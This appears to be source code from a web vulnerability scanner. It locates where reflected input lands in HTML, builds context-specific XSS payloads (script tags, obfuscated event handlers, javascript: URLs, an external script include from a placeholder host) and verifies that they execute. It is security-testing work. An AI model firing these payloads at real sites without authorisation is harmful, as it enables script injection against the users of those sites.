"""Context-aware XSS payload generation and verification.

Workflow (same idea as Wapiti):
1. a harmless random taint is injected; if it is reflected, the HTML is parsed
   and every place the taint appears is classified (text node, attribute value,
   attribute name, tag name or comment) together with useful details: quote
   character around the value, enclosing tag, parents that prevent script
   execution (<textarea>, <title>, <noscript>...), existing event handlers...
2. for each context, payload templates are adapted so they break out of it
   (close the quote/tag/parent first, or add an event handler attribute),
3. after sending a payload, the response is parsed and the payload is only
   confirmed if the expected tag/attribute really exists in an executable place.
"""
import re
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple

from protest.active.base import Payload, random_string
from protest.parsing.dom import Node, parse_html
from protest.net.response import Response

NONEXEC_PARENTS = {
    "iframe", "noframes", "noembed", "noscript", "plaintext", "style", "template", "textarea", "title", "xmp",
    "frameset",
}
SELF_CLOSING = {
    "area", "base", "br", "col", "embed", "hr", "img", "input", "keygen", "link", "meta", "param", "source",
    "track", "wbr", "frame",
}

# Random domain: an external script include can be verified without any real server
EXTERNAL_ENDPOINT = f"https://{random_string(length=8)}.pro-test.invalid/"


@dataclass
class XssTemplate:
    name: str
    payload: str
    tags: List[str]
    attribute: str  # attribute name, or "string" / "full_string" for text content
    value: str
    case_sensitive: bool = True
    close_tag: bool = True
    match_type: str = "exact"  # exact | starts_with
    requirements: Set[str] = field(default_factory=set)
    injection_type: str = "javascript"  # javascript | html


ON_TAGS = ["a", "abbr", "b", "body", "button", "code", "div", "em", "font", "form", "h1", "h2", "h3", "i", "img",
           "input", "label", "li", "p", "pre", "select", "small", "span", "strong", "table", "td", "th", "tr", "u",
           "ul", "ol", "textarea", "option", "section", "article", "header", "footer", "nav", "main", "aside"]

XSS_TEMPLATES: List[XssTemplate] = [
    # --- payloads opening their own tag (used after breaking out of the current context)
    XssTemplate("script_alert_quote", "<ScRiPt>alert('__XSS__')</sCrIpT>", ["script"], "full_string",
                "alert('__XSS__')"),
    XssTemplate("script_alert_double_quote", '<ScRiPt>alert("__XSS__")</sCrIpT>', ["script"], "full_string",
                'alert("__XSS__")'),
    XssTemplate("script_alert_regex", "<ScRiPt>alert(/__XSS__/)</sCrIpT>", ["script"], "full_string",
                "alert(/__XSS__/)"),
    XssTemplate("script_alert_backtick", "<ScRiPt>alert(`__XSS__`)</sCrIpT>", ["script"], "full_string",
                "alert(`__XSS__`)"),
    XssTemplate("script_parentheses_regex", "<ScRiPt>(alert)(/__XSS__/);</ScRiPt>", ["script"], "full_string",
                "(alert)(/__XSS__/);"),
    XssTemplate("svg_onload_regex", "<SvG/oNloAd=alert(/__XSS__/)>", ["svg"], "onload", "alert(/__XSS__/)"),
    XssTemplate("svg_onload_left_open", "<SvG/oNloAd=alert(/__XSS__/)//", ["svg"], "onload", "alert(/__XSS__/)",
                match_type="starts_with"),
    XssTemplate("svg_onload_lf", "<SvG[LF]oNloAd=alert('__XSS__')>", ["svg"], "onload", "alert('__XSS__')"),
    XssTemplate("img_onerror_quote", "<ImG src=z oNeRror=alert('__XSS__')>", ["img"], "onerror",
                "alert('__XSS__')"),
    XssTemplate("img_onerror_regex", "<ImG src=z oNeRror=alert(/__XSS__/)>", ["img"], "onerror",
                "alert(/__XSS__/)"),
    XssTemplate("img_onerror_tabs", "<ImG[TAB]src=z[TAB]oNeRror=alert(/__XSS__/)>", ["img"], "onerror",
                "alert(/__XSS__/)"),
    XssTemplate("details_ontoggle", "<DeTaIlS open oNtOgGlE=alert(/__XSS__/)>", ["details"], "ontoggle",
                "alert(/__XSS__/)"),
    XssTemplate("input_autofocus", "<InPuT autofocus oNfOcUs=alert(/__XSS__/)>", ["input"], "onfocus",
                "alert(/__XSS__/)"),
    XssTemplate("video_source_onerror", "<video><source oNeRrOr=alert(/__XSS__/)>", ["source"], "onerror",
                "alert(/__XSS__/)"),
    XssTemplate("body_onload", "<BoDy oNlOaD=alert(/__XSS__/)>", ["body"], "onload", "alert(/__XSS__/)"),
    XssTemplate("marquee_onstart", "<MaRqUeE oNsTaRt=alert(/__XSS__/)>", ["marquee"], "onstart",
                "alert(/__XSS__/)"),
    XssTemplate("iframe_src_javascript", "<IfRaMe src=jaVasCript:alert(/__XSS__/)>", ["iframe"], "src",
                "javascript:alert(/__XSS__/)", case_sensitive=False),
    XssTemplate("a_href_javascript", "<A hReF=jaVasCript:alert(/__XSS__/)>clic</A>", ["a"], "href",
                "javascript:alert(/__XSS__/)", case_sensitive=False),
    XssTemplate("script_external_src", "<ScRiPt src=[EXTERNAL_ENDPOINT]__XSS__z.js></ScRiPt>", ["script"], "src",
                "[EXTERNAL_ENDPOINT]__XSS__z.js", case_sensitive=False),
    # --- payloads staying inside the current tag (attribute value contexts)
    XssTemplate("attr_autofocus_onfocus",
                "[ATTR_SEP]autofocus[ATTR_SEP]oNfOcUs=[VALUE_SEP]alert(/__XSS__/)[VALUE_SEP][ATTR_SEP]x=[VALUE_SEP]",
                ["input", "select", "textarea", "button"], "onfocus", "alert(/__XSS__/)", close_tag=False),
    XssTemplate("attr_onmouseover",
                "[ATTR_SEP]oNmOuSeOvEr=[VALUE_SEP]alert(/__XSS__/)[VALUE_SEP][ATTR_SEP]x=[VALUE_SEP]",
                ON_TAGS, "onmouseover", "alert(/__XSS__/)", close_tag=False),
    XssTemplate("attr_image_onerror",
                "[ATTR_SEP]src=[VALUE_SEP]z[VALUE_SEP][ATTR_SEP]oNeRrOr=[VALUE_SEP]alert(/__XSS__/)[VALUE_SEP]"
                "[ATTR_SEP]x=[VALUE_SEP]",
                ["input"], "onerror", "alert(/__XSS__/)", close_tag=False, requirements={"type=image"}),
    XssTemplate("attr_href_javascript", "jaVasCript:alert(/__XSS__/)", ["a", "area"], "href",
                "javascript:alert(/__XSS__/)", case_sensitive=False, close_tag=False),
    XssTemplate("attr_src_javascript", "jaVasCript:alert(/__XSS__/)", ["iframe", "frame"], "src",
                "javascript:alert(/__XSS__/)", case_sensitive=False, close_tag=False),
    # --- HTML injection (no script execution proven, still markup injection)
    XssTemplate("html_custom_tag", "<PrOtEsT id=__XSS__>injected</PrOtEsT>", ["protest"], "id", "__XSS__",
                injection_type="html"),
    XssTemplate("html_external_image", "<ImG src=[EXTERNAL_ENDPOINT]__XSS__.png>", ["img"], "src",
                "[EXTERNAL_ENDPOINT]__XSS__.png", case_sensitive=False, injection_type="html"),
]
TEMPLATES_BY_NAME: Dict[str, XssTemplate] = {t.name: t for t in XSS_TEMPLATES}


def _render(text: str) -> str:
    return (text.replace("[TAB]", "\t").replace("[LF]", "\n").replace("[FF]", "\x0c")
            .replace("[EXTERNAL_ENDPOINT]", EXTERNAL_ENDPOINT))


# ---------------------------------------------------------------------- context detection
def _similar_case(original: str, new: str) -> str:
    return "".join(n.lower() if o.islower() else n.upper() for o, n in zip(original, new))


def replace_with_unique_values(text: str, keyword: str) -> Tuple[str, List[str]]:
    """Give each reflection of `keyword` its own random marker of the same length."""
    lower_keyword = keyword.lower()
    result, taints, start = [], [], 0
    lower_text = text.lower()
    while True:
        index = lower_text.find(lower_keyword, start)
        if index == -1:
            break
        original = text[index:index + len(keyword)]
        replacement = _similar_case(original, random_string("x", len(original)))
        result.append(text[start:index])
        result.append(replacement)
        taints.append(replacement)
        start = index + len(keyword)
    result.append(text[start:])
    return "".join(result), taints


def find_non_exec_parent(node: Node) -> str:
    """Name of the upper-most parent preventing JavaScript execution ('' if none)."""
    found = ""
    for parent in node.parents:
        if parent.name in NONEXEC_PARENTS:
            found = parent.name
    return found


def find_separator(html_code: str, tainted_value: str, tag_name: str, attr_name: Optional[str] = None) -> str:
    lower_code = html_code.lower()
    code_index = lower_code.index(tainted_value)
    tag_index = lower_code.rindex("<" + tag_name, 0, code_index)
    tag_end = lower_code.find(">", code_index + len(tainted_value))
    if tag_end == -1:
        tag_end = len(lower_code)
    attributes = lower_code[tag_index + len(tag_name) + 1:tag_end]
    patterns = []
    if attr_name:
        patterns.append(re.compile(rf"{re.escape(attr_name.lower())}\s*=\s*(?:(['\"])(.*?)\1|([^\s>]*))", re.S))
    patterns.append(re.compile(r"[^\s>=]+\s*=\s*(?:(['\"])(.*?)\1|([^\s>]*))", re.S))
    for pattern in patterns:
        for match in pattern.finditer(attributes):
            quote = match.group(1)
            value = match.group(2) if quote else match.group(3)
            if value and tainted_value in value:
                return quote or ""
    return ""


def _special_attributes(node: Node) -> Set[str]:
    specials = {name for name in ("href", "src", "style") if name in node.attrs}
    if "type" in node.attrs:
        specials.add(f"type={node.attrs['type'].lower()}")
    if "rel" in node.attrs:
        specials.add(f"rel={(node.attrs['rel'].split() or [''])[0].lower()}")
    return specials


def get_context_list(html_code: str, keyword: str) -> List[dict]:
    tainted_code, taints = replace_with_unique_values(html_code, keyword)
    root = parse_html(tainted_code)
    contexts: List[dict] = []

    def add(context: dict, taint: str):
        for key, value in context.items():
            if isinstance(value, str):
                context[key] = value.replace(taint, keyword)
        if context not in contexts:
            contexts.append(context)

    for taint in (t.lower() for t in taints):
        framesets_seen: List[Node] = []
        for node in root.descendants():
            if node.is_tag and node.name == "frameset":
                framesets_seen.append(node)
            parents = set(map(id, node.parents))
            executable = all(id(fs) in parents for fs in framesets_seen if fs is not node)

            if node.is_tag:
                if not executable:
                    continue
                events = {name for name in node.attrs if name.startswith("on")}
                in_attrs = False
                for attr_name, attr_value in node.attrs.items():
                    if taint in (attr_value or "").lower():
                        in_attrs = True
                        try:
                            separator = find_separator(tainted_code, taint, node.name, attr_name)
                        except ValueError:
                            separator = ""
                        context = {
                            "type": "attrval", "name": attr_name, "tag": node.name,
                            "non_exec_parent": find_non_exec_parent(node), "events": events,
                            "separator": separator,
                        }
                        specials = _special_attributes(node)
                        if specials:
                            context["special_attributes"] = specials
                        add(context, taint)
                    if taint in attr_name:
                        in_attrs = True
                        context = {
                            "type": "attrname", "name": attr_name, "tag": node.name,
                            "non_exec_parent": find_non_exec_parent(node), "events": events,
                        }
                        add(context, taint)
                if not in_attrs and taint in node.name:
                    add({"type": "tag", "value": node.name, "non_exec_parent": find_non_exec_parent(node),
                         "events": events}, taint)
            elif node.is_comment and taint in node.data.lower() and executable:
                add({"type": "comment", "parent": node.parent.name, "non_exec_parent": find_non_exec_parent(node)},
                    taint)
            elif node.is_text and taint in node.data.lower() and executable:
                add({"type": "text", "parent": node.parent.name, "non_exec_parent": find_non_exec_parent(node)},
                    taint)
    return contexts


# ---------------------------------------------------------------------- payload generation
def _meet_requirements(requirements: Set[str], specials: Set[str]) -> str:
    prefix = ""
    for requirement in requirements:
        if requirement.startswith("!"):
            if requirement[1:] in specials:
                raise RuntimeError("requirement cannot be met")
            continue
        if requirement in specials:
            continue
        if "=" in requirement:
            attribute, value = requirement.split("=", 1)
            if any(s.startswith(attribute + "=") for s in specials):
                raise RuntimeError("requirement cannot be met")
        else:
            attribute, value = requirement, "z"
        prefix += f"[ATTR_SEP]{attribute}=[VALUE_SEP]{value}"
    return prefix


def _payload(template: XssTemplate, code: str) -> Payload:
    return Payload(code, name=template.name, injection_type=template.injection_type)


def apply_context(context: dict, code: str) -> List[Payload]:
    results: List[Payload] = []
    ctype = context["type"]
    for template in XSS_TEMPLATES:
        body = _render(template.payload).replace("__XSS__", code)
        if ctype == "attrval":
            if not template.close_tag:
                if context["tag"] not in template.tags or template.attribute in context["events"]:
                    continue
                if context["separator"]:
                    attr_sep = value_sep = context["separator"]
                else:
                    attr_sep, value_sep = " ", ""
                if (template.attribute == "href" and context["tag"] in ("a", "area")) or \
                        (template.attribute == "src" and context["tag"] in ("iframe", "frame")):
                    if context["name"] != template.attribute:
                        continue
                    js_code = body
                else:
                    if context["name"] in ("href", "src") and template.attribute in ("href", "src"):
                        continue
                    try:
                        js_code = "y" + _meet_requirements(template.requirements, context.get("special_attributes",
                                                                                                set()))
                    except RuntimeError:
                        continue
                    js_code = (js_code + body).replace("[ATTR_SEP]", attr_sep).replace("[VALUE_SEP]", value_sep)
                results.append(_payload(template, js_code))
            else:
                js_code = context["separator"]
                js_code += ">" if context["tag"] in SELF_CLOSING else f"></{context['tag']}>"
                if context["non_exec_parent"] == "frameset":
                    continue
                if context["non_exec_parent"]:
                    js_code += f"</{context['non_exec_parent']}>"
                results.append(_payload(template, js_code + body))
        elif not template.close_tag:
            continue
        elif ctype == "attrname":
            if code == context["name"]:
                prefix = ">" + (f"</{context['non_exec_parent']}>" if context["non_exec_parent"] else "")
                results.append(_payload(template, prefix + body))
        elif ctype == "tag":
            prefix = f"</{context['non_exec_parent']}>" if context["non_exec_parent"] else ""
            if context["value"].startswith(code):
                results.append(_payload(template, (prefix + body)[1:] if not prefix else prefix + body))
            else:
                results.append(_payload(template, "/>" + prefix + body))
        elif ctype == "text":
            prefix = ""
            if context["parent"] in ("script", "title", "textarea", "style"):
                prefix = f"</{context['non_exec_parent'] or context['parent']}>"
            elif context["non_exec_parent"]:
                prefix = f"</{context['non_exec_parent']}>"
            results.append(_payload(template, prefix + body))
        elif ctype == "comment":
            prefix = "-->"
            if context["parent"] in ("script", "title", "textarea", "style"):
                prefix += f"</{context['non_exec_parent'] or context['parent']}>"
            elif context["non_exec_parent"]:
                prefix += f"</{context['non_exec_parent']}>"
            results.append(_payload(template, prefix + body))
    return results


def generate_payloads(html_code: str, code: str) -> List[Payload]:
    payloads: List[Payload] = []
    seen = set()
    for context in get_context_list(html_code, code):
        for payload in apply_context(context, code):
            if payload.payload not in seen:
                seen.add(payload.payload)
                payloads.append(payload)
    # JavaScript payloads first, plain HTML injection afterwards
    payloads.sort(key=lambda p: p.injection_type != "javascript")
    return payloads


# ---------------------------------------------------------------------- verification
def valid_xss_content_type(response: Response) -> bool:
    if "content-type" not in response.headers:
        return True
    content_type = response.headers.get("content-type", "").lower()
    return any(mime in content_type for mime in ("text/html", "application/xhtml+xml", "text/xml",
                                                 "application/xml"))


def _compare(left: str, right: str, method: str, case_sensitive: bool) -> bool:
    if not case_sensitive:
        left, right = left.lower(), right.lower()
    if method == "starts_with":
        return left.startswith(right)
    return left == right


def check_payload(html_code: str, payload: Payload, taint: str) -> bool:
    """Confirm the payload produced the expected executable element in the page."""
    template = TEMPLATES_BY_NAME.get(payload.name)
    if template is None:
        return False
    expected = _render(template.value).replace("__XSS__", taint)
    root = parse_html(html_code)
    attr = None if template.attribute in ("string", "full_string") else template.attribute
    for tag in root.find_all(template.tags, attr):
        non_exec = find_non_exec_parent(tag)
        if non_exec and not (tag.name == "frame" and non_exec == "frameset"):
            continue
        if template.attribute == "string":
            text = tag.string
            if text and (expected in text if template.case_sensitive else expected.lower() in text.lower()):
                return True
        elif template.attribute == "full_string":
            text = tag.string
            if text and _compare(text.strip(), expected, template.match_type, template.case_sensitive):
                return True
        elif template.attribute in tag.attrs:
            if _compare(tag.attrs[template.attribute], expected, template.match_type, template.case_sensitive):
                return True
    return False
